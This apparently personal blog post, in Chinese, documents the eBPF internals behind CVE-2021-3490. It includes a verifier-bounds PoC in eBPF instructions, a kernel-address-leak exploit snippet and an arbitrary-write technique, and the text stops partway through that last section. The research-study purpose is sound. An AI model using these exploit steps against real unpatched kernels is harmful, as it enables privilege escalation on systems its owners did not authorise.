<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>Linux eBPF模块漏洞利用学习记录</title><meta name="description" content="A person often meets his destiny on the road he took to avoid it."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
技术分析eBPF简介linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：BPF（Berkeley Packet Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以map（key，value）的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。
BPF发展经历了2个阶段，cBPF（classic BPF）和eBPF（extend BPF）（linux内核3.15以后），cBPF已退出历史舞台，后文提到的BPF默认为eBPF。
eBPF.."><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Q1IQ's blog" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Q1IQ's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Linux eBPF模块漏洞利用学习记录</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><span class="toc-text">技术分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#eBPF%E7%AE%80%E4%BB%8B"><span class="toc-text">eBPF简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#eBPF%E8%99%9A%E6%8B%9F%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F"><span class="toc-text">eBPF虚拟指令系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BPF%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B"><span class="toc-text">BPF加载过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84eBPF%E9%AA%8C%E8%AF%81%E7%A8%8B%E5%BA%8F"><span class="toc-text">内核中的eBPF验证程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2021-3490"><span class="toc-text">CVE-2021-3490</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-text">漏洞调用链</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9EPOC"><span class="toc-text">漏洞POC</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-text">任意地址读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text">漏洞利用总结</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CVE"><i class="tag post-item-tag">CVE</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Linux eBPF模块漏洞利用学习记录</h1><time class="has-text-grey" datetime="2022-03-01T02:22:15.000Z">2022-03-01</time><article class="mt-2 post-content"><p><img src="/images/nasa-whDrFMucHkc-unsplash.jpg" alt="cover"></p>
<h2 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h2><h4 id="eBPF简介"><a href="#eBPF简介" class="headerlink" title="eBPF简介"></a>eBPF简介</h4><p>linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：<code>BPF（Berkeley Packet Filter）</code>提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以<code>map（key，value）</code>的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。</p>
<p>BPF发展经历了2个阶段，<code>cBPF（classic BPF）</code>和<code>eBPF（extend BPF）</code>（linux内核3.15以后），cBPF已退出历史舞台，后文提到的BPF默认为eBPF。</p>
<p>eBPF程序的运行过程如下：在用户空间生产eBPF“字节码”，然后将“字节码”加载进内核中的“虚拟机”中，然后进行一系列检查，通过则能够在内核中执行这些“字节码”。类似Java与JVM虚拟机，但是这里的虚拟机是在内核中的。</p>
<p>eBPF起初是用于捕获和过滤特定规则的网络数据包，现在也被用在防火墙，安全，内核调试与性能分析等领域。</p>
<p><img src="/img/image-20220312150439245.png" alt="image-20220312150439245"></p>
 <center>图 Bvp47-美国NSA方程式的顶级后门使用BPF技术实现隐蔽信道</center> 

<div style="page-break-after: always; break-after: page;"></div>

<h4 id="eBPF虚拟指令系统"><a href="#eBPF虚拟指令系统" class="headerlink" title="eBPF虚拟指令系统"></a>eBPF虚拟指令系统</h4><p><strong>寄存器</strong>eBPF虚拟指令系统属于RISC（所有指令长度相同），拥有10个虚拟寄存器，R0-R10，在实际运行时，虚拟机会把这10个寄存器一一对应于硬件CPU的10个物理寄存器，以x64为例，对应关系如下：</p>
<pre><code class="c">    R0 – rax (函数返回值)
    R1 - rdi (参数)
    R2 - rsi (参数)
    R3 - rdx (参数)
    R4 - rcx (参数)
    R5 - r8  (参数)
    R6 - rbx
    R7 - r13
    R8 - r14
    R9 - r15
    R10 – rbp（只读，栈指针，frame pointer）</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p><strong>指令结构体</strong> </p>
<p><code>struct bpf_insn</code>，每一个eBPF程序都是一个<code>bpf_insn</code>数组，使用bpf系统调用将其载入内核。</p>
<pre><code class="rust">struct bpf_insn &#123;
    __u8    code;        /* opcode */
    __u8    dst_reg:4;    /* dest register */
    __u8    src_reg:4;    /* source register */
    __s16    off;        /* signed offset */
    __s32    imm;        /* signed immediate constant */
&#125;;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p><strong>功能</strong></p>
<p>程序功能由code字节决定，最低3位表示大类功能，共<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.110/source/include/uapi/linux/bpf_common.h#L6">7类大功能</a>：</p>
<pre><code class="c">#define BPF_CLASS，
(code) ((code) &amp; 0x07)
#define        BPF_LD        0x00 
#define        BPF_LDX        0x01
#define        BPF_ST        0x02
#define        BPF_STX        0x03
#define        BPF_ALU        0x04
#define        BPF_JMP        0x05
#define        BPF_RET        0x06
#define        BPF_MISC  0x07</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p>各大类功能可组合成不同的新功能。</p>
<p><strong>例如</strong>一条简单的x86指令：<code>mov esi,0xffffffff</code>，对应BPF指令为<code>BPF_MOV32_IMM(BPF_REG_2, 0xffffffff)</code>，对应数据结构为：</p>
<pre><code class="c">#define BPF_MOV32_IMM(DST, IMM)                    \
    ((struct bpf_insn) &#123;                    \
        .code  = BPF_ALU | BPF_MOV | BPF_K,        \
        .dst_reg = DST,                    \
        .src_reg = 0,                    \
        .off   = 0,                    \
        .imm   = IMM &#125;)</code></pre>
<p><code>dst_reg</code>代表目的寄存器，限制为0-10；<code>src_reg</code>代表目的寄存器，限制为0-10；<code>off</code>代表地址偏移；<code>imm</code>代表立即数。</p>
<p>这里BPF_X 指基于寄存器的操作数（register-based operations），BPF_K 指基于立即操作数（immediate-based operations）。</p>
<div style="page-break-after: always; break-after: page;"></div>

<h4 id="BPF加载过程"><a href="#BPF加载过程" class="headerlink" title="BPF加载过程"></a>BPF加载过程</h4><p>（1）<code>syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))</code></p>
<p>申请一个map结构，这个结构是用户态与内核态交互的一块共享内存，在<code>attr</code>结构体中指定map的类型、大小、最大容量。map会被分配一个文件描述符。</p>
<pre><code class="c">int bpf_create_map(enum bpf_map_type map_type, 
  unsigned int key_size, unsigned int value_size,  unsigned int max_entries)&#123;
    union bpf_attr attr = &#123;
        .map_type = map_type,
        .key_size = key_size, //表示索引的大小
        .value_size = value_size, //map数组每个元素的大小
        .max_entries = max_entries   //map数组的大小
  &#125;;  
    return syscall(__NR_BPF, BPF_MAP_CREATE, &amp;attr, sizeof(attr));
&#125;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p>内核态调用<code>BPF_FUNC_map_lookup_elem</code>查看map中的数据，用户态通过<code>syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr))</code>查看map中的数据。</p>
<pre><code class="c">int bpf_lookup_elem(int fd, const void *key, void *value)
&#123;
    union bpf_attr attr = &#123;
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
    &#125;;

    return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));
&#125;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p><code>syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr))</code></p>
<p>对map数据进行更新。</p>
<pre><code class="c">int bpf_update_elem(int fd, const void *key, const void *value,
                    uint64_t flags)
&#123;
    union bpf_attr attr = &#123;
        .map_fd = fd,
        .key = ptr_to_u64(key),
        .value = ptr_to_u64(value),
        .flags = flags,
    &#125;;

    return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));
&#125;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p>（2）<code>syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))</code></p>
<p>将用户编写的EBPF代码加载进入内核，采用模拟执行对代码进行合法性检查，<code>attr</code>结构体中包含了指令数量、指令首地址指针、日志级别等属性。</p>
<pre><code class="c">int bpf_prog_load(enum bpf_prog_type type,
                  const struct bpf_insn *insns, int insn_cnt, 
                  const char *license)&#123;
    union bpf_attr attr = &#123;
        .prog_type = type,
        .insns = ptr_to_u64(insns),
        .insn_cnt = insn_cnt,
        .license = ptr_to_u64(license),
        .log_buf = ptr_to_u64(bpf_log_buf),
        .log_size = LOG_BUF_SIZE,
        .log_level = 1,
    &#125;;
    return syscall(__NR_BPF, BPF_PROG_LOAD, &amp;attr, sizeof(attr));&#125;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p>（3）<code>setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)</code>—将用户写的BPF程序绑定到指定的socket上，<code>progfd</code>为上一步骤的返回值。</p>
<p>（4）用户程序通过操作上一步骤中的socket来触发BPF真正执行。此后对于每一个socket数据包执行EBPF代码进行检查，此时为真实执行。</p>
<div style="page-break-after: always; break-after: page;"></div>

<p><strong>总结：加载过程</strong></p>
<pre><code class="c"> mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 0x100);
    if (mapfd &lt; 0) __exit(strerror(errno));
    puts(&quot;mapfd finished&quot;);
    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
            (struct bpf_insn *)__prog, PROGSIZE, &quot;GPL&quot;, 0); //__prog代码
    if (progfd &lt; 0) __exit(strerror(errno));
    puts(&quot;bpf_prog_load finished&quot;);
    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) __exit(strerror(errno));
    puts(&quot;socketpair finished&quot;);
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0) __exit(strerror(errno));
    puts(&quot;setsockopt finished&quot;);</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<h4 id="内核中的eBPF验证程序"><a href="#内核中的eBPF验证程序" class="headerlink" title="内核中的eBPF验证程序"></a>内核中的eBPF验证程序</h4><p>允许用户代码在内核中运行存在一定的危险性。因此，在加载每个eBPF程序之前，都要执行合法性检查。主要函数是bpf_check()，包含check_cfg()和do_check_main()函数。</p>
<p>第一，调用check_cfg()——确保eBPF程序能正常终止，不包含任何可能导致内核锁定的循环。这是通过对程序的控制流图CFG进行深度优先搜索来实现的。程序需3个条件：a.所有指令必须可达；b.没有往回跳转的指令；c.没有跳的太远超出指令范围的指令。</p>
<p>第二，调用do_check_main()-&gt;do_check_common()-&gt;do_check()——内核验证器（verifier ），模拟eBPF程序的执行，模拟通过后才能正常加载。在执行每条指令之前和之后，都需要检查虚拟机状态，以确保寄存器和堆栈状态是有效的。禁止越界跳转，也禁止访问非法数据。</p>
<p>第三，验证器使用eBPF程序类型来限制可以从eBPF程序中调用哪些内核函数以及可以访问哪些数据结构。</p>
<div style="page-break-after: always; break-after: page;"></div>

<p>bpf程序的执行流程如下图：</p>
<img src="img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Bhbmhld3U5OTE5,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述" style="zoom:67%;" />

<p>在verify阶段，当指针和常数进行各种数学运算，如addr+x时，会使用x的取值范围去验证这样的运算是否越界。</p>
<p>所以，如果在verify阶段，常数变量的取值范围计算存在逻辑上的漏洞，就会导致该变量实际运行时的值不在取值范围内。 假设用户申请了一块0x1000的map，然后用户想读写map+x位置的内存，x是常数变量。由于漏洞，verify阶段计算x的取值范围是 0&lt;=x&lt;=0x1000, 验证通过，然后jit compile成汇编执行。但是实际用户传入x的值是0x2000，这样就导致了内存的越界读写。 CVE-2020-8835、CVE-2020-27194、CVE-2021-3490以及GeekPwn的kernel题都是这种类型的洞。</p>
<div style="page-break-after: always; break-after: page;"></div>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h4 id="CVE-2021-3490"><a href="#CVE-2021-3490" class="headerlink" title="CVE-2021-3490"></a>CVE-2021-3490</h4><p>影响版本： Linux kernel before version 5.12.4</p>
<p>漏洞成因：eBPF模块—<code>kernel/bpf/verifier.c</code>的按位操作（AND、OR 和 XOR）的 eBPF ALU32 边界跟踪没有正确更新 32 位边界，造成 Linux 内核中的越界读取和写入，从而导致任意代码执行。</p>
<div style="page-break-after: always; break-after: page;"></div>

<h5 id="漏洞调用链"><a href="#漏洞调用链" class="headerlink" title="漏洞调用链"></a>漏洞调用链</h5><p>adjust_scalar_min_max_vals在更新边界时，会调用scalar32_min_max_and和scalar_min_max_and分别更新32位和64位边界。</p>
<pre><code class="c">static int adjust_scalar_min_max_vals(..)
&#123;
...
case BPF_AND:
      dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off,       
      src_reg.var_off);
      scalar32_min_max_and(dst_reg, &amp;src_reg);    // &lt;---
      scalar_min_max_and(dst_reg, &amp;src_reg);
      break;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p>但是开发者错误地假设了处理64位的scalar_min_max_and的__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);会帮32位更新边界，因此没有在32位的scalar32_min_max_and里写边界更新函数。</p>
<pre><code class="c">static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,
                                 struct bpf_reg_state *src_reg)
&#123;
    bool src_known = tnum_subreg_is_const(src_reg-&gt;var_off);
    bool dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);
    struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);
    s32 smin_val = src_reg-&gt;s32_min_value;
    u32 umax_val = src_reg-&gt;u32_max_value;
    /* Assuming scalar64_min_max_and will be called so its safe
    * to skip updating register for known 32-bit case.   
    */
    if (src_known &amp;&amp; dst_known)
        return;
...&#125;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p>实际上，64位的scalar_min_max_and会使用__mark_reg_known更新32位边界的条件是，src和dst都是64位数，因此，32位的dst_reg并没有更新边界。</p>
<p>这导致32位的dst_reg的边界是计算前的值，而非计算后的值。</p>
<pre><code class="c">static void scalar_min_max_and(struct bpf_reg_state *dst_reg,
                              struct bpf_reg_state *src_reg)
&#123;
    bool src_known = tnum_is_const(src_reg-&gt;var_off);
    bool dst_known = tnum_is_const(dst_reg-&gt;var_off);
    s64 smin_val = src_reg-&gt;smin_value;
    u64 umin_val = src_reg-&gt;umin_value;

    if (src_known &amp;&amp; dst_known) &#123;
            __mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);
            return;
    &#125;
  ...&#125;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p>接着 adjust_scalar_min_max_vals() 会调用以下三个函数来更新 dst_reg 寄存器的边界。每个函数都包含32位和64位的处理部分，我们这里只关心32位的处理部分。reg 的边界是根据当前边界和 reg-&gt;var_off 来计算的。min边界是取 max{当前min边界、reg确定的值}，会变大；max边界是取 min{当前max边界，reg确定的值}，会变小。</p>
<pre><code class="c">static void __update_reg32_bounds(struct bpf_reg_state *reg)&#123;
    struct tnum var32_off = tnum_subreg(reg-&gt;var_off);
    reg-&gt;s32_min_value = max_t(s32, reg-&gt;s32_min_value, var32_off.value
                               | (var32_off.mask &amp; S32_MIN));
     reg-&gt;s32_max_value = min_t(s32, reg-&gt;s32_max_value,
        var32_off.value | (var32_off.mask &amp; S32_MAX));
     reg-&gt;u32_min_value = max_t(u32, reg-&gt;u32_min_value, (u32)var32_off.value);
     reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,
           (u32)(var32_off.value |  var32_off.mask));&#125;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<h5 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h5><p>构造指令<code>BPF_ALU64_REG(BPF_AND, R2, R3)</code>，对 R2 和 R3 进行与操作，并保存到 R2。</p>
<ul>
<li><code>R2-&gt;var_off = &#123;mask = 0xFFFFFFFF00000000; value = 0x1&#125;</code>，表示R2低32位已知为1，高32位未知。由于低32位已知，所以其32位边界也为1。</li>
<li><code>R3-&gt;var_off = &#123;mask = 0x0; value = 0x100000002&#125;</code>，表示其整个64位都已知，为 <code>0x100000002</code>。</li>
</ul>
<p>更新R2的32位边界的步骤如下：</p>
<ul>
<li>先调用 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031">adjust_scalar_min_max_vals()</a> -&gt; <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/tnum.c#L86">tnum_and()</a> 对 <code>R2-&gt;var_off</code> 和 <code>R3-&gt;var_off</code> 进行AND操作，并保存到 <code>R2-&gt;var_off</code>。**结果 <code>R2-&gt;var_off = &#123;mask = 0x100000000; value = 0x0&#125;</code>**，由于R3是确定的且R2高32位不确定，所以运算后，只有第32位是不确定的。</li>
</ul>
<pre><code class="c">struct tnum tnum_and(struct tnum a, struct tnum b)
&#123;
    u64 alpha, beta, v;

    alpha = a.value | a.mask;
    beta = b.value | b.mask;
    v = a.value &amp; b.value;
    return TNUM(v, alpha &amp; beta &amp; ~v);
&#125;</code></pre>
<p>再调用 adjust_scalar_min_max_vals() -&gt; scalar32_min_max_and()，会直接返回，因为R2和R3的低32位都已知。</p>
<p>再调用 <code>adjust_scalar_min_max_vals()</code> -&gt; <code>__update_reg_bounds()</code> -&gt;<code> __update_reg32_bounds()</code> ，会设置 u32_max_value = 0，因为 var_off.value = 0 &lt; u32_max_value = 1。同时，设置 u32_min_value = 1，因为 var_off.value = 0 &lt; u32_min_value。带符号边界也一样。（因为这里的 u32_max_value和 u32_min_value还是R2原本的值）。最后得到寄存器 R2 — {u,s}32_max_value = 0 &lt; {u,s}32_min_value = 1。</p>
<p>POC</p>
<pre><code class="c">BPF_LD_IMM64(BPF_REG_8, 0x1),                    //  r8 = 0x1
BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 32),// r8 &lt;&lt;= 32     0x10000 0000
BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 2),    // r8 += 2       0x10000 0002
BPF_MAP_GET(0, BPF_REG_5),        // r5 = *(u64 *)(r0 +0) 64位均为unknown
BPF_MOV64_REG(BPF_REG_6, BPF_REG_5),    // r6 = r5
BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF),    // r2 = 0xffffffff
BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),    // r2 &lt;&lt;= 32         0xFFFFFFFF00000000
BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_2),    // r6 &amp;= r2  高32位 unknown, 低32位known 为0
BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),    // r6 += 1     mask = 0xFFFFFFFF00000000, value = 0x1
// trigger the vulnerability
BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_8),     // r6 &amp;= r8         r6: u32_min_value=1, u32_max_value=0

BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),            // r6 += 1         r6: u32_max_value = 1, u32_min_value = 2, var_off = &#123;0x100000000; value = 0x1&#125;
BPF_JMP32_IMM(BPF_JLE, BPF_REG_5, 1, 1),        // if w5 &lt;= 0x1 goto pc+1   r5: u32_min_value = 0, u32_max_value = 1, var_off = &#123;mask = 0xFFFFFFFF00000001; value = 0x0&#125;
BPF_EXIT_INSN(),
BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_5),    // r6 += r5         r6: verify:2   fact:1 
BPF_MOV32_REG(BPF_REG_6, BPF_REG_6),            // w6 = w6         对64位进行截断，只看32位部分
BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1),            //r6: verify:0   fact:1 </code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><strong>verifier 日志输出</strong></p>
<p>加载BPF程序时设置log_level=2，可在<code>verifier</code>检测出指令错误时输出指令信息</p>
<img src="img/image-20220313114419490.png" alt="image-20220313114419490" style="zoom:67%;" />

<div style="page-break-after: always; break-after: page;"></div>

<p><strong>runtime调试</strong></p>
<p><code>ALU Sanitation</code>是运行时检查指令执行情况的保护机制，可以通过插桩观察BPF指令是否已经改变。</p>
<p>为了获取每条指令执行时的寄存器状态，可以关闭<code>CONFIG_BPF_JIT</code>选项并在<code>___bpf_prog_run()</code>插入<code>printk</code>语句，<code>regs</code>指向寄存器值，<code>insn</code>指向指令。</p>
<p>编译时设置<code>CONFIG_BPF_JIT</code>，则BPF程序在verifier验证后是JIT及时编译的；如果不设置该选项，则采用eBPF解释器来解码并执行BPF程序。</p>
<p>示例如下：</p>
<p><img src="/img/image-20220313114340052.png" alt="image-20220313114340052"></p>
<div style="page-break-after: always; break-after: page;"></div>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h4 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h4><p><code> bpf_create_map</code>创建map，传入用户数据，这个结构是用户态与内核态交互的一块共享内存。<code>bpf_create_map()</code>实际调用<code>map_create()</code>来创建<code>bpf_array</code>结构，用户传入的数据放在value[] 处，value在 bpf_array 中偏移0x110，所以bpf_map的结构地址是*(&amp;map-0x110)</p>
<pre><code class="c">struct bpf_array &#123;
    struct bpf_map map;     &lt;-----------------
...
    struct bpf_array_aux *aux;
    union &#123;
        char value[];        &lt;----------------- 0x110
...</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p>创建map时设置 BPF_MAP_TYPE_ARRAY 类型时，会将ops指针赋值为array_map_ops， array_map_ops 是一个全局结构包含很多函数指针，可以用于泄露内核地址；设置为BPF_MAP_TYPE_STACK 时 ops指针赋值为 stack_map_ops。</p>
<pre><code class="c">struct bpf_map &#123;
    const struct bpf_map_ops *ops;  &lt;-----------------
    struct bpf_map *inner_map_meta;
    void *security;
    enum bpf_map_type map_type;
    //....
    u64 writecnt;
&#125;</code></pre>
<pre><code class="c">const struct bpf_map_ops array_map_ops = &#123;
    .map_alloc_check = array_map_alloc_check,
    .map_alloc = array_map_alloc,
    .map_free = array_map_free,
    .map_get_next_key = array_map_get_next_key,
    .map_lookup_elem = array_map_lookup_elem,
    .map_update_elem = array_map_update_elem,
    .map_delete_elem = array_map_delete_elem,
    .map_gen_lookup = array_map_gen_lookup,
    .map_direct_value_addr = array_map_direct_value_addr,
    .map_direct_value_meta = array_map_direct_value_meta,
    .map_seq_show_elem = array_map_seq_show_elem,
    .map_check_btf = array_map_check_btf,
&#125;;</code></pre>
<pre><code class="c">// /kernel/bpf/queue_stack_maps.c#L272         BPF_MAP_TYPE_STACK
const struct bpf_map_ops stack_map_ops = &#123;
    .map_alloc_check = queue_stack_map_alloc_check,
    .map_alloc = queue_stack_map_alloc,
    .map_free = queue_stack_map_free,
    .map_lookup_elem = queue_stack_map_lookup_elem,
    .map_update_elem = queue_stack_map_update_elem,
    .map_delete_elem = queue_stack_map_delete_elem,
    .map_push_elem = queue_stack_map_push_elem,
    .map_pop_elem = stack_map_pop_elem,
    .map_peek_elem = stack_map_peek_elem,
    .map_get_next_key = queue_stack_map_get_next_key,
&#125;;</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<p><strong>泄露内核地址</strong>：读取<code>bpf_array-&gt;map-&gt;ops</code>指针，位于 <code>&amp;value[0]-0x110</code> (eBPF程序中可以获取<code>&amp;value[0]</code>，再减去0x110即可)，用户层调用<code>bpf_lookup_elem()</code>读取map数据。</p>
<p>EXP</p>
<pre><code class="c">BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),        // r6=0x110
BPF_MAP_GET_ADDR(0, BPF_REG_7),                    // r7 = &amp;map[0]
BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),    // r7 -= r6
BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),    // r8 = *(u64 *)(r7 +0)
BPF_MAP_GET_ADDR(4, BPF_REG_6),                    //r6 = &amp;map[4]
BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),    // *(u64 *)(r6 +0) = r8</code></pre>
<div style="page-break-after: always; break-after: page;"></div>

<h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>调用 <code>bpf_create_map()</code> 构造<code>bpf_array</code>时，类型设置为 BPF_MAP_TYPE_QUEUE 或者 BPF_MAP_TYPE_STACK 。（这样bpf_array-&gt;map-&gt;ops会被赋值为全局函数表queue_map_ops或stack_map_ops，其中包含可利用的map_push_elem函数指针）。</p>
<p>在exp_value上布置伪造的array_map_ops，伪造的 array_map_ops 中将 map_push_elem 填充为map_get_next_key ，这样调用map_push_elem时就会调用map_get_next_key ，并将&amp;exp_value[0]的地址覆盖到map[0]，同时要构造 map 的一些字段绕过某些检查。</p>
<pre><code class="c">struct bpf_array &#123;
    struct bpf_map map;     // &lt;-------- 覆盖为 &amp;exp_value[0]
    u32 elem_size;
    u32 index_mask;
    struct bpf_array_aux *aux;
    union &#123;
        char value[];        // 用户数据 exp_value，放置伪造的 array_map_ops 函数表
        void *ptrs[];
        void *pptrs[];
    &#125;;
&#125;</code></pre>
